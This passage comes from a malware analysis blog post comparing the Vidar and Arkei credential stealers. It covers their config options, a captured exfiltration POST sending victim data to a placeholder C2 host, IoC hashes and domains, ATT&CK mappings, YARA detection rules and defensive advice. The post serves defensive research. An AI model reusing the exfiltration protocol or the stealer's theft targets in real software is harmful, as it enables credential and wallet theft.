<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="455" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/config_differences_arkei_vidar/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?fit=1123%2C415&amp;ssl=1" data-orig-size="1123,415" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="config_differences_arkei_vidar" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?fit=300%2C111&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?fit=900%2C332&amp;ssl=1" class="alignnone size-full wp-image-455" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?resize=900%2C333&#038;ssl=1" alt="config_differences_arkei_vidar" width="900" height="333" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?w=1123&amp;ssl=1 1123w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?resize=300%2C111&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?resize=768%2C284&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?resize=1024%2C378&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/config_differences_arkei_vidar.png?resize=1100%2C407&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p>If you want to understand what is the purpose the config format for Arkei</p>
<table border="0" cellspacing="0">
<colgroup span="2" width="85"></colgroup>
<tbody>
<tr>
<td align="right" height="17">1</td>
<td align="left">Saved Passwords</td>
</tr>
<tr>
<td align="right" height="17">1</td>
<td align="left">Cookies / Autofill</td>
</tr>
<tr>
<td align="right" height="17">1</td>
<td align="left">History</td>
</tr>
<tr>
<td align="right" height="17">2</td>
<td align="left">CryptoCurrency</td>
</tr>
<tr>
<td align="right" height="17">2</td>
<td align="left">Skype</td>
</tr>
<tr>
<td align="right" height="17">2</td>
<td align="left">Steam</td>
</tr>
<tr>
<td align="right" height="17">1</td>
<td align="left">Telegram</td>
</tr>
<tr>
<td align="right" height="17">1</td>
<td align="left">Screenshot</td>
</tr>
<tr>
<td align="right" height="17">1</td>
<td align="left">Grabber</td>
</tr>
<tr>
<td align="left" height="17">txt:log:</td>
<td align="left">Grabber Config</td>
</tr>
<tr>
<td align="right" height="17">50</td>
<td align="left">Max Size (kb)</td>
</tr>
<tr>
<td align="right" height="17">2</td>
<td align="left">Self Delete</td>
</tr>
</tbody>
</table>
<p>Also, there are some slight changes in the last POST requests, Vidar is just adding new fields like the profile and the versioning.</p>
<p>To understand how far the requests looks the same, let&#8217;s dig into a PCAP file. I indicated the differences in red, and apart from the versioning and profile values, all rest is the same. But if we dig into some older sample, it&#8217;s impossible to see the differences except the path of the request.</p>
<p><em><strong>Last POST request &#8211; Vidar</strong></em></p>
<pre>POST / HTTP/1.1
Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1
Accept-Language: ru-RU,ru;q=0.9,en;q=0.8
Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1
Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0
Content-Type: multipart/form-data; boundary=1BEF0A57BE110FD467A
Content-Length: 66809
Host: <em><strong>some.lovely.vidar.c2.with.love</strong></em>
Connection: Keep-Alive
Cache-Control: no-cache

--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="hwid"

90059c37-1320-41a4-b58d-2b75a9850d2f
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="os"

Windows 7 Professional
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="platform"

x86
<strong><span style="color: #ff0000;">--1BEF0A57BE110FD467A</span>
<span style="color: #ff0000;">Content-Disposition: form-data; name="profile"</span>

<span style="color: #ff0000;">XXX &lt;- Random Int</span></strong>
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="user"

admin
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="cccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="ccount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="fcount"

0
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="telegram"

0
<strong><span style="color: #ff0000;">--1BEF0A57BE110FD467A</span>
<span style="color: #ff0000;">Content-Disposition: form-data; name="ver"</span>

<span style="color: #ff0000;">4.1</span></strong>
--1BEF0A57BE110FD467A
Content-Disposition: form-data; name="logs"; filename="COUNTRY_.zip"
Content-Type: zip</pre>
<h3>Features differences</h3>
<p>When we dig into the different features, there is some config part on Vidar that is in fact just some placebo options. in an example, the Steam stealing feature is implemented in Arkei is not found in Vidar. This is also the same thing with Skype but in contrary 2FA stealing stuff is only on Vidar (with what I have seen on samples in my possession).</p>
<div id="attachment_495" style="width: 760px" class="wp-caption alignnone"><img data-recalc-dims="1" loading="lazy" decoding="async" aria-describedby="caption-attachment-495" data-attachment-id="495" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/vidar_missing_part/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_missing_part.png?fit=750%2C175&amp;ssl=1" data-orig-size="750,175" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="vidar_missing_part" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_missing_part.png?fit=300%2C70&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_missing_part.png?fit=750%2C175&amp;ssl=1" class="alignnone size-full wp-image-495" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_missing_part.png?resize=750%2C175&#038;ssl=1" alt="vidar_missing_part" width="750" height="175" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_missing_part.png?w=750&amp;ssl=1 750w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/vidar_missing_part.png?resize=300%2C70&amp;ssl=1 300w" sizes="auto, (max-width: 750px) 100vw, 750px" /><p id="caption-attachment-495" class="wp-caption-text"><em>Strings only present in Arkei and not in the Vidar that I analyzed</em></p></div>
<h2>Is Arkei still active and maintained?</h2>
<p>On one of the selling page of this stealer, it&#8217;s still sold and continue to be updated. For example, it reveals that soon a final update on it will be pushed (v10). So let&#8217;s see how this will turn.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="490" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/arkei_updates/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?fit=1241%2C498&amp;ssl=1" data-orig-size="1241,498" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Arkei_updates" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?fit=300%2C120&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?fit=900%2C361&amp;ssl=1" class="alignnone size-full wp-image-490" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?resize=900%2C361&#038;ssl=1" alt="Arkei_updates" width="900" height="361" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?w=1241&amp;ssl=1 1241w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?resize=300%2C120&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?resize=768%2C308&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?resize=1024%2C411&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Arkei_updates.png?resize=1100%2C441&amp;ssl=1 1100w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<h2>The Vidar Cracked Version</h2>
<p>There is also in the wild a cracked version that was already spotted by some people on twitter. This Vidar or &#8220;Anti-Vidar&#8221; as called in the source code of the panel and It&#8217;s based on an early Vidar build (v2.3 it seems).</p>
<p><strong><em>Login</em></strong></p>
<p>The login is identical to the Android Lokibot panel (thanks to <a href="https://twitter.com/siri_urz">@siri_urz</a>). As always when confronted at this kind of stuff, the code never lies (or it seems) for helping us to identify what is the real C2/Malware.</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="460" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/auth_vidar_cracked/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?fit=2295%2C902&amp;ssl=1" data-orig-size="2295,902" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Auth_Vidar_Cracked" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?fit=300%2C118&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?fit=900%2C353&amp;ssl=1" class="alignnone size-full wp-image-460" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?resize=900%2C354&#038;ssl=1" alt="Auth_Vidar_Cracked" width="900" height="354" srcset="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?w=2295&amp;ssl=1 2295w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?resize=300%2C118&amp;ssl=1 300w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?resize=768%2C302&amp;ssl=1 768w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?resize=1024%2C402&amp;ssl=1 1024w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?resize=1100%2C432&amp;ssl=1 1100w, https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/Auth_Vidar_Cracked.png?w=1800&amp;ssl=1 1800w" sizes="auto, (max-width: 900px) 100vw, 900px" /></p>
<p><strong><em>Profile code</em></strong></p>
<p>The profile is far more simple than the nowadays panels and samples, the default profile is hardcoded on the PHP file, and will get it if the value is 11.</p>
<h2>IoCs</h2>
<p><em><strong>SHA256 Hashes</strong></em></p>
<p>3A20466CC8C07638B8882CCC9B14C08F605F700F03D388CF85B2E76C51D64D65 0E982A02D754588D4EE99F30084B886B665FF04A1460D45C4FD410B04B10A8AF 2679FA8E9FD0C1F6F26527D53759BB596FDA43A741B4DFCC99A8C0907836A835 9EC586B07961E0C93C830DD1C47598FE21277432F11809A4B73DF7370CDD2E29 42C6950CA57D8805C217E3334158DAB4CC71A50C94D77F608B1C442BFD2B01CA D71F81EDF8AC04639D3B7C80AA178DF95C2CBFE73F81E931448A475FB771267A DAD5FCEAB002791DD6FD575782C173F1A39E0E7CE36E6DE1BAEFA95D0A8FB889 66162E69CA30A75E0DD1A6FBB9028FCFBE67B4ADE8E844E7C9FF2DCB46D993D8 EFF272B93FAA1C8C403EA579574F8675AB127C63ED21DB3900F8AB4FE4EC6DA9 EDBAC320C42DE77C184D30A69E119D27AE3CA7D368F802D2F8F1DA3B8D01D6DD B1D5B79D13F95A516ABBCC486841C8659984E5135F1D9C74343DCCD4390C3475 543AEE5A5435C77A8DE01433079F6381ADB4110F5EF4350E9A1A56B98FE40292 65B2BD17E452409397E2BD6F8E95FE8B708347D80074861698E4683BD12437A9 47E89F2C76D018D4952D421C5F1D603716B10E1712266DA32F63082F042F9C46 5D37323DA22C5414F6E03E06EFD184D7837D598C5E395E83C1BF248A7DE57155 5C0AF9C605AFD72BEF7CE8184BCCC9578EDB3A17498ACEBB74D02EB4AF0A6D2E 65287763245FDD8B56BB72298C78FEA62405BD35794A06AFBBE23CC5D38BE90A 20E92C2BF75C473B745617932F8DC0F8051BFC2F91BB938B2CC1CD808EBBC675 C752B68F3694B2FAAB117BCBA36C156514047B75151BBBFE62764C85CEF8ADE5 AE2EBF5B5813F92B0F7D6FCBADFA6E340646E4A776163AE86905E735A4B895A0 8F73E9C44C86D2BBADC545CED244F38472C5AACE0F75F57C8FC2398CE0A7F5A1</p>
<p>thx <a href="https://twitter.com/benkow_">@benkow_</a> for the help to find some samples 🙂</p>
<p><em><strong>Domains</strong></em></p>
<p>malansio.com<br />
nasalietco.com<br />
binacoirel.com<br />
newagenias.com<br />
bokolavrstos.com<br />
naicrose.com<br />
benderio.com<br />
cool3dmods.com</p>
<h2>MITRE ATT&amp;CK</h2>
<ul>
<li><a href="https://attack.mitre.org/techniques/T1082">Discovery &#8211; System Information Discovery</a></li>
<li><a href="https://attack.mitre.org/techniques/T1124">Discovery &#8211; System Time Discovery</a></li>
<li><a href="https://attack.mitre.org/techniques/T1012">Discovery &#8211; Query Registry</a></li>
<li><a href="https://attack.mitre.org/techniques/T1057/">Discovery &#8211; Process Discovery</a></li>
<li><a href="https://attack.mitre.org/techniques/T1059">Execution &#8211; Command-Line Interface</a></li>
<li><a href="https://attack.mitre.org/techniques/T1129">Execution &#8211; Execution through Module Load</a></li>
<li><a href="https://attack.mitre.org/techniques/T1081">Credential Access &#8211; Credentials in Files</a></li>
<li><a href="https://attack.mitre.org/techniques/T1113">Collection &#8211; Screen Capture</a></li>
<li><a href="https://attack.mitre.org/techniques/T1025">Collection &#8211; Data From Removable Media </a></li>
<li><a href="https://attack.mitre.org/techniques/T1005/">Collection &#8211; Data from Local System</a></li>
<li><a href="https://attack.mitre.org/techniques/T1002">Exfiltration &#8211; Data Compressed</a></li>
</ul>
<p>&nbsp;</p>
<h2>Yara Rules</h2>
<p><em><strong>Vidar</strong></em></p>
<pre>rule Vidar_Stealer : Vidar 
{
    meta:
        description = "Yara rule for detecting Vidar stealer"
        author = "Fumik0_"

    strings:
        $mz = { 4D 5A }

        $s1 = { 56 69 64 61 72 }
        $s2 = { 31 42 45 46 30 41 35 37 42 45 31 31 30 46 44 34 36 37 41 }
    condition:
        $mz at 0 and ( (all of ($s*)) )
}

rule Vidar_Early : Vidar 
{
    meta:
        description = "Yara rule for detecting Vidar stealer - Early versions"
        author = "Fumik0_"

    strings:
        $mz = { 4D 5A }
        $s1 =  { 56 69 64 61 72 }
        $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 }
    condition:
         $mz at 0 and all of ($hx*) and not $s1
}

rule AntiVidar : Vidar 
{
    meta:
        description = "Yara rule for detecting Anti Vidar - Vidar Cracked Version"
        author = "Fumik0_"

    strings:
        $mz = { 4D 5A }
        $s1 = { 56 69 64 61 72 }
        $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 }
        $hx2 = { 78 61 6B 66 6F 72 2E 6E  65 74 00 }
    condition:
         $mz at 0 and all of ($hx*) and not $s1
}</pre>
<p><em><strong>Arkei</strong></em></p>
<pre> rule Arkei : Arkei
rule Arkei : Arkei
{
     meta:
          Author = "Fumik0_"
          Description = "Rule to detect Arkei"
          Date = "2018/12/11"

      strings:
          $mz = { 4D 5A }

          $s1 = "Arkei" wide ascii
          $s2 = "/server/gate" wide ascii
          $s3 = "/server/grubConfig" wide ascii
          $s4 = "\\files\\" wide ascii
          $s5 = "SQLite" wide ascii

          $x1 = "/c taskkill /im" wide ascii
          $x2 = "screenshot.jpg" wide ascii
          $x3 = "files\\passwords.txt" wide ascii
          $x4 = "http://ip-api.com/line/" wide ascii
          $x5 = "[Hardware]" wide ascii
          $x6 = "[Network]" wide ascii
          $x7 = "[Processes]" wide ascii

          $hx1 = { 56 00 69 00 64 00 61 00 72 00 2E 00 63 00 70 00 70 00 }


     condition:
          $mz at 0 and
          ( (all of ($s*)) or ((all of ($x*)) and not $hx1))
}
</pre>
<h2>Github</h2>
<ul>
<li><a href="https://github.com/Fmk0/scripts/blob/master/izanami.py">Extract Vidar Config</a></li>
<li><a href="https://github.com/Fmk0/work/tree/master/Vidar">Profiles dumped</a></li>
</ul>
<h2>Recommendations</h2>
<p>This is, as usual, the same thing that I said about my precedent blog post.</p>
<ul>
<li style="text-align: justify;">Always running stuff inside a VM, be sure to install a lot of stuff linked to the hypervisor (like Guest Addons tools)  to trigger as much as possible all kind of possible Anti-VM detection and closing malware.</li>
<li style="text-align: justify;">When you have done with your activities stop the VM and restore it with a Specific clean snapshot.</li>
<li>Avoid storing files at a pre-destined path (Desktop, Documents, Downloads), put at a place that is not common.</li>
<li style="text-align: justify;">Don&#8217;t be stupid to click on cracks on youtube, hack software for popular games, or &#8220;wonderful&#8221; easy cash money (like Free Bitcoin Program /facepalm).</li>
<li>Flush your browser after each visit, never saved your passwords directly on your browser or using auto-fill features.</li>
<li>Don&#8217;t use the same password for all your websites (use 2FA and it&#8217;s possible).</li>
</ul>
<h2>Conclusion</h2>
<p>This analysis was a kind of a mystery game. It&#8217;s hard to understand if Vidar is an evolution of Arkei or a forked malware based on his code. As far it seems this is currently an active one and growing up. A lot of updates are pushed on it regularly probably due because this is a young (forked/copycat) malware. With the fact, that this stealer was also using the skin theme of Android Lokibot (due to the cracked version), this could really lose some minds for identifying what is the correct name of the C2, without any samples to analyze. For now, let&#8217;s see with the time if we will more answers to put the puzzle together for this stealer. <strong>¯\_(ツ)_/¯</strong></p>
<p>On my side, if I could sum up this year. I have done way more things than I could imagine because 2018 was a really &#8220;reaaalllyyyy&#8221; thought year, with a lot of problems and huge issues. Let&#8217;s see how this next year will be. But now, it&#8217;s time to rest and eat because there were so many sleep hours destroy and skip meals this year for learning stuff.</p>
<p>Special thanks to my buddies (they will know who they are), you are the best &lt;3</p>
<p><img data-recalc-dims="1" loading="lazy" decoding="async" data-attachment-id="453" data-permalink="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/break_time_umaru/" data-orig-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/break_time_umaru.gif?fit=540%2C338&amp;ssl=1" data-orig-size="540,338" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="break_time_umaru" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/break_time_umaru.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/break_time_umaru.gif?fit=540%2C338&amp;ssl=1" class=" size-full wp-image-453 aligncenter" src="https://i0.wp.com/fumik0.com/wp-content/uploads/2018/12/break_time_umaru.gif?resize=540%2C338&#038;ssl=1" alt="break_time_umaru" width="540" height="338" /></p>
<p>#HappyHunting<br />
#SeeYouIn2019</p>
<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul><li class="share-twitter"><a rel="nofollow noopener noreferrer" data-shared="sharing-twitter-436" class="share-twitter sd-button share-icon" href="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/?share=twitter" target="_blank" title="Click to share on Twitter" ><span>Twitter</span></a></li><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-436" class="share-facebook sd-button share-icon" href="https://fumik0.com/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/?share=facebook" target="_blank" title="Click to share on Facebook" ><span>Facebook</span></a></li><li class="share-end"></li></ul></div></div></div><div class='sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded' id='like-post-wrapper-140610880-436-67628d424ea55' data-src='https://widgets.wp.com/likes/?ver=14.2-a.3#blog_id=140610880&amp;post_id=436&amp;origin=fumik0.com&amp;obj_id=140610880-436-67628d424ea55&amp;n=1' data-name='like-post-frame-140610880-436-67628d424ea55' data-title='Like or Reblog'><h3 class="sd-title">Like this:</h3><div class='likes-widget-placeholder post-likes-widget-placeholder' style='height: 55px;'><span class='button'><span>Like</span></span> <span class="loading">Loading...</span></div><span class='sd-text-color'></span><a class='sd-link-color'></a></div>
															</div>

						</article>

						<section class="modified-date" itemprop="dateModified" content="2019-03-19T14:03:23+00:00">
							Last modified: March 19, 2019						</section>

						<section class="tags">
							<a href="https://fumik0.com/tag/reverse/" rel="tag">reverse</a><a href="https://fumik0.com/tag/stealer/" rel="tag">stealer</a>						</section>

																<h3 class="section-title">Author</h3>
			<aside class="author-card" itemscope itemprop="author" itemtype="http://schema.org/Person">
				<div class="author-avatar">
					<img src="https://secure.gravatar.com/avatar/60460a1a0d00b32720a59ee2624bb4aa?s=96&#038;d=identicon&#038;r=g" class="rounded-circle" itemprop="image">
				</div>
				<div class="author-info">
					<div class="author-title">
						<a href="https://fumik0.com/author/fumko/" itemprop="name">
							fumko						</a>
					</div>
					<div class="author-description" itemprop="description">  
											</div>
				</div>
			</aside>
								
													
<div id="comments" class="discussion-wrapper">
	<h3 class="section-title">Comments</h3>
	<div class="discussion-timeline">
								
		<div id="respond" class="comment-respond">
			<h3 id="reply-title" class="comment-reply-title">Leave a Reply<small><a rel="nofollow" id="cancel-comment-reply-link" href="/2018/12/24/lets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis/#respond" style="display:none;">Cancel reply</a></small></h3>			<form id="commentform" class="comment-form">
				<iframe
					title="Comment Form"
					src="https://jetpack.wordpress.com/jetpack-comment/?blogid=140610880&#038;postid=436&#038;comment_registration=0&#038;require_name_email=1&#038;stc_enabled=1&#038;stb_enabled=1&#038;show_avatars=1&#038;avatar_default=identicon&#038;greeting=Leave+a+Reply&#038;jetpack_comments_nonce=05cb692ba9&#038;greeting_reply=Leave+a+Reply+to+%25s&#038;color_scheme=light&#038;lang=en_US&#038;jetpack_version=14.2-a.3&#038;iframe_unique_id=1&#038;show_cookie_consent=10&#038;has_cookie_consent=0&#038;is_current_user_subscribed=0&#038;token_key=%3Bnormal%3B&#038;sig=3b7a574f1e1b39e82dd8a1cb80870cdb818cacbc#parent=https%3A%2F%2Ffumik0.com%2F2018%2F12%2F24%2Flets-dig-into-vidar-an-arkei-copycat-forked-stealer-in-depth-analysis%2F"
											name="jetpack_remote_comment"
						style="width:100%; height: 430px; border:0;"
										class="jetpack_remote_comment"
					id="jetpack_remote_comment"
					sandbox="allow-same-origin allow-top-navigation allow-scripts allow-forms allow-popups"
				>
									</iframe>
									<!--[if !IE]><!-->
					<script>
						document.addEventListener('DOMContentLoaded', function () {
							var commentForms = document.getElementsByClassName('jetpack_remote_comment');
							for (var i = 0; i < commentForms.length; i++) {
								commentForms[i].allowTransparency = false;
								commentForms[i].scrolling = 'no';
							}
						});
					</script>
					<!--<![endif]-->
							</form>
		</div>

		
		<input type="hidden" name="comment_parent" id="comment_parent" value="" />

			</div>
</div>

												
					
							</main>

							<aside id="aside-container" class="col-lg-4 col-md-4 col-sm-12" role="complementary">
					
	<div id="sidebar" class="sidebar">
		<section id="categories-3" class="widget widget_categories"><h2 class="widget-title">Categories</h2>
			<ul>
					<li class="cat-item cat-item-602944907"><a href="https://fumik0.com/category/botnet/">botnet</a> (2)
</li>
	<li class="cat-item cat-item-602944904"><a href="https://fumik0.com/category/projects/">Projects</a> (1)
</li>
	<li class="cat-item cat-item-602944906"><a href="https://fumik0.com/category/reverse/">Reverse</a> (7)
</li>
	<li class="cat-item cat-item-1"><a href="https://fumik0.com/category/uncategorized/">Uncategorized</a> (3)
</li>
			</ul>

			</section><section id="archives-3" class="widget widget_archive"><h2 class="widget-title">Archives</h2>
			<ul>
					<li><a href='https://fumik0.com/2021/06/'>June 2021</a></li>
	<li><a href='https://fumik0.com/2021/04/'>April 2021</a></li>
	<li><a href='https://fumik0.com/2019/12/'>December 2019</a></li>
	<li><a href='https://fumik0.com/2019/08/'>August 2019</a></li>
	<li><a href='https://fumik0.com/2019/05/'>May 2019</a></li>
	<li><a href='https://fumik0.com/2019/03/'>March 2019</a></li>
	<li><a href='https://fumik0.com/2019/02/'>February 2019</a></li>
	<li><a href='https://fumik0.com/2018/12/'>December 2018</a></li>
	<li><a href='https://fumik0.com/2018/10/'>October 2018</a></li>
	<li><a href='https://fumik0.com/2018/05/'>May 2018</a></li>
	<li><a href='https://fumik0.com/2018/01/'>January 2018</a></li>
			</ul>

			</section>	</div>

	<div id="sidebar-sticky" class="sidebar sticky-top">
		<nav id="toc" class="toc" role="navigation"></nav>
	</div>
				</aside>
			
		</div><!-- .row -->
		
	<nav class="navigation post-navigation" aria-label="Posts">
		<h2 class="screen-reader-text">Post navigation</h2>
		<div class="nav-links"><div class="nav-previous"><a href="https://fumik0.com/2018/10/15/predator-the-thief-in-depth-analysis-v2-3-5/" rel="prev"><i class="fas fa-angle-left"></i> <span class="screen-reader-text">Previous Post</span> Predator The Thief: In-depth analysis (v2.3.5)</a></div><div class="nav-next"><a href="https://fumik0.com/2019/02/27/cpu-power-usage-sandbox-evasive-technique/" rel="next"><i class="fas fa-angle-right"></i> <span class="screen-reader-text">Next Post</span> CPU Power Usage &#8211; Sandbox Evasive Technique</a></div></div>
	</nav>	</div><!-- .container -->
</div><!-- .data-schema -->


			<footer class="footer" role="contentinfo">
								<section class="footer-sidebar">
					<div class="container px-responsive">
						<div class="row my-4">
							<section id="rss_links-5" class="widget widget_rss_links col-lg col-md-4 col-sm-12"><p><a target="_self" href="https://fumik0.com/feed/" title="Subscribe to posts"><img src="https://fumik0.com/wp-content/plugins/jetpack/images/rss/orange-small.png" alt="RSS feed" /></a></p>
</section>						</div>
					</div>
				</section>
				
				<div class="container footer-columns">
					<div class="footer-column-left">
						<div>Copyright &copy; 2024 <strong><a href="https://fumik0.com">Fumik0_&#039;s box</a></strong>. All rights reserved. Theme by <a href="https://terryl.in/" target="_blank">Mynote</a>. </div>
						<div></div>
					</div>
					<div class="footer-column-right">
						<nav class="footer-nav"><ul id="menu-social-media" class="social-icon-links"><li id="menu-item-273"><a href="http://tracker.fumik0.com"><i class="fas fa-link"></i></a></li>
<li id="menu-item-13"><a target="_blank" href="https://twitter.com/fumik0_"><span class="brand-sm"><i class="fab fa-twitter twitter brand-link"></i></span></a></li>
<li id="menu-item-424"><a href="https://github.com/Fmk0"><span class="brand-sm"><i class="fab fa-github-alt github brand-link"></i></span></a></li>
<li id="menu-item-426"><a href="https://www.youtube.com/channel/UClEmTjO2nLjbwGht-OckQhA"><span class="brand-sm"><i class="fab fa-youtube youtube brand-link"></i></span></a></li>
</ul></nav>					</div>
				</div>

			</footer>
		</div><!-- .wrapper -->
			<script>

	jQuery( document ).ready(function( $ ) {
		const win = $( window );
		const doc = $( document );
		const progressBar = $( 'progress' );
		const progressLabel = $( '.progress-label' );
		const setValue = () => win.scrollTop();
		const setMax = () => doc.height() - win.height();
		const setPercent = () => Math.round( win.scrollTop() / (doc.height() - win.height()) * 100 );
